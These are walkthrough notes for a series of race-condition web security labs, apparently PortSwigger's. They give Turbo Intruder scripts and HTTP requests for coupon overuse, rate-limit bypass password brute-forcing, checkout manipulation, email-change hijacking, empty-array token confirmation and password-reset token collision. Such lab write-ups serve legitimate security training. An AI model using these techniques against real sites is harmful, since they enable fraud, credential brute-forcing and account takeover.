# Race Conditions
Race conditions occur when websites process requests concurrently without adequate safeguards. This can lead to multiple distinct threads interacting with the same data at the same time, resulting in a "collision" that causes unintended behavior in the application. A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior for malicious purposes. 

### LAB: Limit overrun race conditions
Apply the coupon for the first time and send that `POST /cart/coupon HTTP/2` to repeater for as many time as you want (the more the better). 
Group all those request into a group.
Remove the coupon.  
Use the `Send group (parallel)` function to apply the coupon many times.
Keep doing that process until you got the price that you want and place order.

### LAB: Bypassing rate limits via race conditions
Send `POST /login HTTP/2` to repeater. Change `username` to `carlos`, highlight the value of `password` and send it to Turbo Intruder.
Use `race-single-packet-attack.py` and slightly modify it to use our wordlist from clipboard:

    def queueRequests(target, wordlists):
        # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
        # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
        # for more information, check out https://portswigger.net/research/smashing-the-state-machine
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )

        passwords = wordlists.clipboard

        # the 'gate' argument withholds part of each request until openGate is invoked
        # if you see a negative timestamp, the server responded before the request was complete
        for password in passwords:
            engine.queue(target.req, password, gate='race1')

        # once every 'race1' tagged request has been queued
        # invoke engine.openGate() to send them in sync
        engine.openGate('race1')

    def handleResponse(req, interesting):
        table.add(req)

Start the attack and notice the `302` response code, that is the password of user `carlos`.

### LAB: Multi-endpoint race conditions
Notice the vulnerability can occur when payment validation and order confirmation are performed during the processing of a single request. In this case, you can potentially add more items to your basket during the race window between when the payment is validated and when the order is finally confirmed.
First add a gift card to the cart:

    POST /cart HTTP/2
    productId=2&redir=PRODUCT&quantity=1

Send the request that add the target product to cart and the checkout request to a group in Repeater. Then send them in parallel using `Send group (parallel)`:

    POST /cart HTTP/2
    productId=1&redir=PRODUCT&quantity=1

    POST /cart/checkout HTTP/2
    csrf=vLoUJ2LkjNlmwzLOfuz1BM7waSnhptqY

Repeat the process until the target product is bought.
> Note: warming up connection
> In Burp Repeater, you can try adding a GET request for the homepage to the start of your tab group, then using the Send group in sequence (single connection) option. If the first request still has a longer processing time, but the rest of the requests are now processed within a short window, you can ignore the apparent delay and continue testing as normal.

### LAB: Single-endpoint race conditions
Send this request to repeater and duplicate it: 

    1. POST /my-account/change-email
       email=carlos%40ginandjuice.shop&csrf=1IogGOxtqFjRaz16yRHqq2ilrh2nhpQC

    2. POST /my-account/change-email
       email=wiener@exploit-0ab300c3042da6dfdd5f74bf01bd0067.exploit-server.net&csrf=1IogGOxtqFjRaz16yRHqq2ilrh2nhpQC

Group the 2 request and send them in parallel using `Send group (paralllel)` (might need to retry several times for this to work).
This will take advantage of the race condition vulnerability at the `/change-email` endpoint which cause the server to misbehave and send the confirmation email to the attacker's email.

### LAB: Partial construction race conditions
When registering a new user, an application may create the user in the database and set their API key using two separate SQL statements. This leaves a tiny window in which the user exists, but their API key is uninitialized. 
This kind of behavior paves the way for exploits whereby you inject an input value that returns something matching the uninitialized database value, such as an empty string, or null in JSON, and this is compared as part of a security control. 
In PHP: 
- `param[]=foo` is equivalent to `param = ['foo']`
- `param[]=foo&param[]=bar` is equivalent to `param = ['foo', 'bar']`
- `param[]` is equivalent to `param = []`

In Ruby on Rails: `param[key]` is equivalent to `params = {"param"=>{"key"=>nil}}`
In this lab found that `users.js` is sending the confirmation request via this:

    POST /confirm?token=abcxyz HTTP/2

Make use of the vulnerability as described above, try sending this request which set the token value to an empty array:

    POST /confirm?token[]= HTTP/2

Now use Turbo Intruder to first send the registration request and then immediately send another 50 confirmation requests to exploit race condition:

    POST /register HTTP/2
    Host: 0a46000d0451dd4180fea877003b0086.web-security-academy.net
    Cookie: phpsessionid=HZwgup6YaMUka49rsLDdbTAJ85LAflon
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 88
    Origin: https://0a46000d0451dd4180fea877003b0086.web-security-academy.net
    Referer: https://0a46000d0451dd4180fea877003b0086.web-security-academy.net/register
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Priority: u=0, i
    Te: trailers

    csrf=u74o0pHtyDEPsQc7k6lypI21zsEgrcVr&username=%s&email=sth%40ginandjuice.shop&password=123

Use this script and start the attack:

    def queueRequests(target, wordlists):

        engine = RequestEngine(endpoint=target.endpoint,
                                concurrentConnections=1,
                                engine=Engine.BURP2
                                )
        
        confirmationReq = '''POST /confirm?token[]= HTTP/2
    Host: 0a46000d0451dd4180fea877003b0086.web-security-academy.net
    Cookie: phpsessionid=HZwgup6YaMUka49rsLDdbTAJ85LAflon
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    Origin: https://0a46000d0451dd4180fea877003b0086.web-security-academy.net
    Referer: https://0a46000d0451dd4180fea877003b0086.web-security-academy.net/confirm?token[]=
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Priority: u=0, i
    Te: trailers

    '''
        for attempt in range(20):
            currentAttempt = str(attempt)
            username = 'dog' + currentAttempt
        
            # queue a single registration request
            engine.queue(target.req, username, gate=currentAttempt)
            
            # queue 50 confirmation requests - note that this will probably sent in two separate packets
            for i in range(50):
                engine.queue(confirmationReq, gate=currentAttempt)
            
            # send all the queued requests for this attempt
            engine.openGate(currentAttempt)

    def handleResponse(req, interesting):
        table.add(req)

Look for the successful message and login with that account to delete user `carlos`.

### LAB: Exploiting time-sensitive vulnerabilities
Notice the token to reset password is of constant length. This indicates that the server might use some hash on a random value such as timestamp.
To successfully bypass this, we must send to reset password requests (1 for the victim, 1 for ourself) that the server would process at the same time.
But even if we group them and send in parallel, the 2 requests differ in time it is respond. This might be due to the way PHP server works (1 request at a time per session).
To circumvent this send to `GET /forgot-password HTTP/2` requests, obtain the `phpsessionid` and `csrf` value and replace it inside the 2 POST requests:

    POST /forgot-password HTTP/2
    Host: 0a0e003e04af104e81f80c4d008100ec.web-security-academy.net
    Cookie: phpsessionid=BGoQ0gJWxzPkxgjw2vhRNqsp9Jo3gH7p

    csrf=PYSnVQPIkY1gS5z7LeMJo4xXzTfC8ziP&username=carlos


    POST /forgot-password HTTP/2
    Host: 0a0e003e04af104e81f80c4d008100ec.web-security-academy.net
    Cookie: phpsessionid=zhqJk4SauhIr36EN5IJnaZU5TjY48tvM

    csrf=gMwRWHJwDUw3IVVPAMlJ7xaEkioFVmuD&username=wiener

Send them in parallel using `Send group (parallel)` and visits `wiener`'s email to obtain the `token` value. Use this token to reset `carlos` password using this request:

    POST /forgot-password?user=carlos&token=d3e92a3daf8835df52da0bfd3e72e37159cb969d HTTP/2
    Host: 0a0e003e04af104e81f80c4d008100ec.web-security-academy.net
    Cookie: phpsessionid=PNpxLcJrdTe5X4SRb0c044iZpdkh3jwo

    csrf=gg7Tof2M4a1REKey6NaypTP9aBojK6Wn&token=d3e92a3daf8835df52da0bfd3e72e37159cb969d&user=carlos&new-password-1=123&new-password-2=123
